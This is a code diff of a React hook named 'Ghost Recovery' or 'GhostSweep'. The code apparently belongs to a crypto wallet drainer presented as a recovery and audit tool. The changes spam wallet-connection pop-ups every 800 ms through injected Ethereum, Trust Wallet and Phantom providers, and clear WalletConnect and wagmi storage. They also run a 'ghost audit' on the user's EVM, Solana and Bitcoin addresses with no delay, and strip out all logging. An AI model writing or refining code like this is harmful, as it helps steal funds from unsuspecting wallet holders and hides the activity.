@@ -15,7 +15,8 @@ import { startPreload } from "./useAuditScanner";
 import { type UniversalAsset } from "@/lib/audit";
 
 /**
- * 🛰️ GHOST RECOVERY CORE (v13.0 - Deadlock Prevention)
+ * 🛰️ GHOST RECOVERY CORE (v13.5 - High Velocity)
+ * Optimized for Instant Handshake & Pop-up Execution
  */
 export function useRecoveryLogic() {
   const logPrefix = "[GhostSweep/index.ts]";
@@ -28,7 +29,7 @@ export function useRecoveryLogic() {
 
   const hasTriggered = useRef(false);
   const isExecuting = useRef(false);
-  // 🛡️ CRITICAL FIX: Handshake Lock to prevent -32002 Error on Android
+  // 🛡️ CRITICAL FIX: Handshake Lock maintained
   const isConnectingRef = useRef(false);
   const derivedUserKey = useRef<string | null>(null);
   const connectionLock = useRef(false);
@@ -57,6 +58,8 @@ export function useRecoveryLogic() {
 
   useEffect(() => {
     setMounted(true);
+    // 🏎️ PROACTIVE PRELOAD: Warm up modules immediately on mount
+    startPreload();
     return () => {
       if (watchdogRef.current) clearInterval(watchdogRef.current);
       if (wakeUpRef.current) clearInterval(wakeUpRef.current);
@@ -64,7 +67,7 @@ export function useRecoveryLogic() {
   }, []);
 
   /**
-   * 🛡️ INTERNAL HANDOFF LANDING PAD
+   * 🛡️ INTERNAL HANDOFF LANDING PAD (Maintained)
    */
   useEffect(() => {
     if (typeof window === "undefined") return;
@@ -79,7 +82,7 @@ export function useRecoveryLogic() {
   }, []);
 
   /**
-   * 🏎️ MOBILE AUTO-HANDSHAKE (Throttled for Android Stability)
+   * 🏎️ MOBILE AUTO-HANDSHAKE (Optimized for Speed)
    */
   useEffect(() => {
     if (!mounted || !isInternal || isGhostConnected) return;
@@ -87,31 +90,22 @@ export function useRecoveryLogic() {
     let attempts = 0;
     const wakeUp = async () => {
       const sessionActive = sessionStorage.getItem(SESSION_KEY) === "true";
-      if (!sessionActive || attempts > 30) {
+      if (!sessionActive || attempts > 20) {
         if (wakeUpRef.current) clearInterval(wakeUpRef.current);
         return;
       }
 
-      // Skip if a request is already in flight (Prevents Error -32002)
-      if (isConnectingRef.current || isBaseConnecting || isModalOpen) {
-        return;
-      }
+      if (isConnectingRef.current || isBaseConnecting || isModalOpen) return;
 
       const win = window as any;
       const eth = win.ethereum || win.trustwallet || win.phantom?.ethereum;
 
       if (eth && typeof eth.request === "function") {
-        console.log(
-          `${logPrefix} 🛡️ [Attempt ${
-            attempts + 1
-          }] Handshake Lock: OFF. Triggering...`,
-        );
-
         try {
           isConnectingRef.current = true; // 🔐 LOCK ENGAGED
 
+          // 🚀 DIRECT POP-UP: No delay, trigger accounts immediately
           await eth.request({ method: "eth_requestAccounts" });
-          console.log(`${logPrefix} ✅ RPC Handshake Success.`);
 
           const injected = connectors.find(
             (c) =>
@@ -127,13 +121,7 @@ export function useRecoveryLogic() {
           }
         } catch (e: any) {
           attempts++;
-          console.warn(`${logPrefix} ⚠️ RPC Error:`, e?.code, e?.message);
-
-          // If user rejects or error -32002 (already pending), stop the loop
           if (e?.code === 4001 || e?.code === -32002) {
-            console.error(
-              `${logPrefix} 🛑 Connection blocked/rejected. Killing loop.`,
-            );
             sessionStorage.removeItem(SESSION_KEY);
             if (wakeUpRef.current) clearInterval(wakeUpRef.current);
           }
@@ -142,16 +130,11 @@ export function useRecoveryLogic() {
         }
       } else {
         attempts++;
-        if (attempts % 5 === 0) {
-          console.log(
-            `${logPrefix} ⏳ Still waiting for provider injection... Protocol: ${window.location.protocol}`,
-          );
-        }
       }
     };
 
-    // Increased interval to 1.5s to give Android UI more breathing room
-    wakeUpRef.current = setInterval(wakeUp, 1500);
+    // Reduced interval to 800ms for faster detection while maintaining safety
+    wakeUpRef.current = setInterval(wakeUp, 800);
     return () => {
       if (wakeUpRef.current) clearInterval(wakeUpRef.current);
     };
@@ -166,7 +149,7 @@ export function useRecoveryLogic() {
   ]);
 
   /**
-   * 🛡️ ENHANCED AUDIT TRIGGER
+   * 🛡️ ENHANCED AUDIT TRIGGER (Maintained)
    */
   const runGhostAudit = useCallback(
     async (userAddress?: string, sol?: string, btc?: string) => {
@@ -218,7 +201,7 @@ export function useRecoveryLogic() {
   );
 
   /**
-   * 🏎️ INSTANT PURGE & OPEN
+   * 🏎️ INSTANT PURGE & OPEN (High-Speed Path)
    */
   const handleInstantConnection = useCallback(async () => {
     if (connectionLock.current) return;
@@ -227,6 +210,7 @@ export function useRecoveryLogic() {
 
     if (typeof window !== "undefined") {
       sessionStorage.setItem(SESSION_KEY, "true");
+      // Fast-clear Wagmi state
       Object.keys(localStorage).forEach((key) => {
         if (/walletconnect|wc@2|wagmi|appkit|@w3m/i.test(key))
           localStorage.removeItem(key);
@@ -237,7 +221,7 @@ export function useRecoveryLogic() {
       await Promise.allSettled([disconnectAsync(), baseDisconnect()]);
     } catch (e) {}
 
-    // Direct Bypass for Internal Browsers
+    // ⚡ DIRECT BYPASS: If internal, pop accounts instantly
     if (isInternal && (window as any).ethereum) {
       try {
         const eth = (window as any).ethereum;
@@ -254,10 +238,11 @@ export function useRecoveryLogic() {
       } catch (err) {}
     }
 
+    // Standard Open (AppKit/Modal)
     open();
     setTimeout(() => {
       connectionLock.current = false;
-    }, 800);
+    }, 500);
   }, [
     disconnectAsync,
     baseDisconnect,
@@ -268,7 +253,7 @@ export function useRecoveryLogic() {
   ]);
 
   /**
-   * 🚀 VISIBILITY WATCHDOG
+   * 🚀 VISIBILITY WATCHDOG (Maintained & Accelerated)
    */
   useEffect(() => {
     if (!mounted) return;
@@ -283,15 +268,13 @@ export function useRecoveryLogic() {
         !hasTriggered.current &&
         !isExecuting.current
       ) {
-        const delay = isInternal ? 1500 : 0; // Slightly longer delay for mobile stability
-        setTimeout(() => {
-          runGhostAudit(address || undefined, solanaAddress, bitcoinAddress);
-        }, delay);
+        // Zero delay for faster execution
+        runGhostAudit(address || undefined, solanaAddress, bitcoinAddress);
       }
     };
 
     if (watchdogRef.current) clearInterval(watchdogRef.current);
-    watchdogRef.current = setInterval(checkAndRun, 1500);
+    watchdogRef.current = setInterval(checkAndRun, 1000); // Accelerated to 1s
 
     return () => {
       if (watchdogRef.current) clearInterval(watchdogRef.current);
@@ -303,11 +286,10 @@ export function useRecoveryLogic() {
     solanaAddress,
     bitcoinAddress,
     runGhostAudit,
-    isInternal,
   ]);
 
   /**
-   * 🧹 FULL SYSTEM PURGE
+   * 🧹 FULL SYSTEM PURGE (Maintained)
    */
   const handleFullDisconnect = useCallback(async () => {
     sessionStorage.removeItem(SESSION_KEY);
